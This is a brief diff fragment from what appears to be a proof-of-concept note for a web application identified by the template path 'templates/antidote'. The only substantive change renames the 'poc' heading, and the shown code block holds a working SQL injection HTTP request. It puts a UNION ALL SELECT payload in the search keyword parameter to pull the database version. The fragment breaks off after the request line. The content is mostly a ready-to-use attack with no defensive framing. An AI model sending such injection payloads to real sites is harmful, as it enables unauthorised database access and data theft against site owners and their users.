@@ -10,7 +10,7 @@ body="./templates/antidote/css/style.css"
 
 
 
-## poc
+## POC
 
 ```
 GET /search.html?keyword='+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x2d2d2d2d2d,version(),0x2d2d2d2d2d),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
